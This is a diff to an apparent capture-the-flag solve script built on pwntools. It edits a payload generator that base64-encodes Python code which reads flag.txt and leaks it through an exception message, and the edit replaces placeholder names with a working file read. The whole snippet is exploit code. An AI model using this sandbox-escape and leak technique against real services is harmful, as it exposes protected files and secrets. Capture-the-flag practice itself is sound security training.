@@ -3,10 +3,10 @@ from pwn import *
 
 def generate_payload():
     code = '''try:
-    raise ExceptionGroup('test', [im_kind])
+    raise ExceptionGroup('test', [error])
 except ExceptionGroup:
-    flag = im_too_kind('flag.txt').read().strip()
-    raise ExceptionGroup(f"FLAG: {flag}", [im_kind])'''
+    flag = open('flag.txt').read().strip()
+    raise ExceptionGroup(f"FLAG: {flag}", [error])'''
     
     encoded = base64.b64encode(code.encode()).decode()
     return encoded
